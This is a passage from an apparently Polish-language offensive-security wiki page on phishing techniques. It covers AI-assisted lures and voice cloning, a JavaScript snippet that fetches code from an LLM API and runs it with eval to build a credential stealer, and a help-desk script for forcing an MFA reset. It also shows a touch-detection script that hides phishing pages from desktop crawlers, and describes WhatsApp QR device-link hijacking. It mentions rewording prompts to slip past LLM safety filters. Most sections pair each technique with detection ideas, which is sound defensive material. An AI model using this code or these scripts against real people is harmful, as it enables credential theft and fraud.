* Obrońcy mogą wyszukiwać wywołania zwrotne HTTP(S) w formie `...page.php?tynor=<COMPUTER>sss<USER>` oraz 5-minutowe interwały odpytywania po załadowaniu DLL.

---

## Operacje phishingowe wspomagane przez AI
Atakujący łączą obecnie **LLM i API klonowania głosu**, aby tworzyć w pełni spersonalizowane przynęty i prowadzić interakcję w czasie rzeczywistym.

| Warstwa | Przykładowe wykorzystanie przez threat actora |
|-------|-------------|
|Automatyzacja|Generowanie i wysyłanie >100 tys. wiadomości e-mail / SMS z losowym sformułowaniem i linkami śledzącymi.|
|Generative AI|Tworzenie *jednorazowych* wiadomości e-mail nawiązujących do publicznych transakcji M&A i wewnętrznych żartów z mediów społecznościowych; deep-fake głosu CEO w scamie polegającym na oddzwonieniu.|
|Agentic AI|Autonomiczne rejestrowanie domen, zbieranie danych z open-source intelligence oraz tworzenie wiadomości kolejnego etapu, gdy ofiara kliknie, ale nie prześle poświadczeń.|

**Obrona:**
• Dodaj **dynamiczne bannery** wyróżniające wiadomości wysyłane z niezaufanej automatyzacji (na podstawie anomalii ARC/DKIM).
• Wdróż **frazy wyzwania biometrii głosu** dla żądań telefonicznych o wysokim ryzyku.
• Stale symuluj przynęty generowane przez AI w programach zwiększania świadomości – statyczne szablony są przestarzałe.

Zobacz także – nadużywanie agentic browsing do phishingu poświadczeń:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz także – nadużywanie przez AI agentów lokalnych narzędzi CLI i MCP (do inwentaryzacji sekretów i wykrywania):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Wspomagane przez LLM składanie phishingowego JavaScript w czasie wykonywania (codegen kodu w przeglądarce)

Atakujący mogą dostarczyć wyglądający nieszkodliwie HTML i **generować stealera w czasie wykonywania**, prosząc **zaufane API LLM** o JavaScript, a następnie wykonując go w przeglądarce (np. za pomocą `eval` lub dynamicznego `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt jako obfuskacja:** kodowanie URL-i eksfiltracji i ciągów Base64 w prompcie; iterowanie nad sformułowaniem w celu obejścia filtrów bezpieczeństwa i ograniczenia halucynacji.
2. **Wywołanie API po stronie klienta:** podczas ładowania JS wywołuje publiczny LLM (Gemini/DeepSeek/itp.) lub proxy CDN; w statycznym HTML obecny jest tylko prompt/wywołanie API.
3. **Składanie i wykonanie:** łączenie odpowiedzi i wykonywanie jej (polimorficzne przy każdej wizycie):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. parsowanie tokenu LogoKit) i wysyła dane uwierzytelniające do ukrytego w prompt endpointu.

**Cechy evasion**
- Ruch trafia do dobrze znanych domen LLM lub renomowanych proxy CDN; czasami przez WebSockets do backendu.
- Brak statycznego payloadu; złośliwy JS istnieje dopiero po renderowaniu.
- Niedeterministyczne generowanie tworzy **unikalne stealery dla każdej sesji**.

**Pomysły na detekcję**
- Uruchamiaj sandboxy z włączonym JS; oznaczaj **runtime `eval`/dynamiczne tworzenie skryptów pochodzące z odpowiedzi LLM**.
- Wyszukuj front-endowe żądania POST do API LLM, po których bezpośrednio następuje `eval`/`Function` na zwróconym tekście.
- Generuj alerty dotyczące niezatwierdzonych domen LLM w ruchu klienckim oraz następujących po nich żądań POST z danymi uwierzytelniającymi.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oprócz klasycznego push-bombingu operatorzy po prostu **wymuszają nową rejestrację MFA** podczas rozmowy z help-deskiem, unieważniając istniejący token użytkownika. Każdy kolejny prompt logowania wygląda dla ofiary wiarygodnie.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w odstępie kilku minut z tego samego adresu IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą po cichu kopiować złośliwe polecenia do schowka ofiary ze zhakowanej lub typosquatted strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując dowolny kod bez żadnego pobierania ani załącznika.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobilny i dystrybucja złośliwych aplikacji (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Przejęcie łączenia urządzenia WhatsApp za pomocą socjotechniki QR
* Strona przynęta (np. fałszywy „kanał” ministerstwa/CERT) wyświetla kod QR WhatsApp Web/Desktop i instruuje ofiarę, aby go zeskanowała, po cichu dodając atakującego jako **połączone urządzenie**.<sup>[[12]](#references)</sup>
* Atakujący natychmiast uzyskuje wgląd w czaty i kontakty, dopóki sesja nie zostanie usunięta. Ofiary mogą później zobaczyć powiadomienie o „połączeniu nowego urządzenia”; obrońcy mogą wyszukiwać nieoczekiwane zdarzenia łączenia urządzeń, które nastąpiły krótko po odwiedzeniu niezaufanych stron z kodami QR.

### Phishing zależny od urządzenia mobilnego w celu obejścia crawlerów/sandboxów
Operatorzy coraz częściej uzależniają swoje przepływy phishingowe od prostego sprawdzenia urządzenia, aby crawlery desktopowe nigdy nie docierały do stron końcowych. Typowy schemat obejmuje niewielki skrypt, który sprawdza, czy DOM obsługuje dotyk, i wysyła wynik do endpointu serwera; klienci niemobilni otrzymują HTTP 500 (lub pustą stronę), podczas gdy użytkownikom urządzeń mobilnych udostępniany jest pełny przepływ.<sup>[[7]](#references)</sup>

Minimalny fragment po stronie klienta (typowa logika):
```html
<script src="/static/detect_device.js"></script>
```
Logika `detect_device.js` (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Często obserwowane zachowanie serwera:
- Ustawia cookie sesji podczas pierwszego ładowania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) dla kolejnych żądań GET, gdy `is_mobile=false`; udostępnia phishing tylko wtedy, gdy `true`.

Heurystyki wyszukiwania i wykrywania:
- Zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria internetowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla urządzeń niemobilnych; prawidłowe ścieżki ofiar mobilnych zwracają 200 wraz z dalszym kodem HTML/JS.
- Blokuj lub analizuj dokładniej strony, które uzależniają zawartość wyłącznie od `ontouchstart` lub podobnych kontroli urządzenia.

Wskazówki dotyczące obrony:
- Uruchamiaj crawlery z fingerprintami przypominającymi urządzenia mobilne i z włączonym JS, aby ujawnić treści objęte ograniczeniami.
- Generuj alerty dotyczące podejrzanych odpowiedzi 500 następujących po `POST /detect` na nowo zarejestrowanych domenach.

## References

- [1] [Generowanie wariantów domen używanych w phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Wykrywanie phishingu: narzędzia i techniki (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kradzież danych uwierzytelniających i omijanie 2FA za pomocą noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Kradzież sesji i omijanie 2FA za pomocą EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jak zainstalować i skonfigurować DKIM z Postfix na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globalny raport Unit 42 dotyczący reagowania na incydenty z 2025 roku – edycja poświęcona inżynierii społecznej](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastruktura phishingowa ograniczona do urządzeń mobilnych i heurystyki (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Następna granica ataków z wykorzystaniem składania w czasie działania: użycie LLM do generowania phishingowego JavaScriptu w czasie rzeczywistym](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Podszywanie się, przejmowanie kliknięć i TDS: analiza ekosystemu dystrybucji malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Przejmowanie ruchu do windows.com firmy Microsoft za pomocą bitflippingu (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Miłość? Właściwie: fałszywa aplikacja randkowa wykorzystana jako przynęta w ukierunkowanej kampanii spyware w Pakistanie](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC i próbki ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
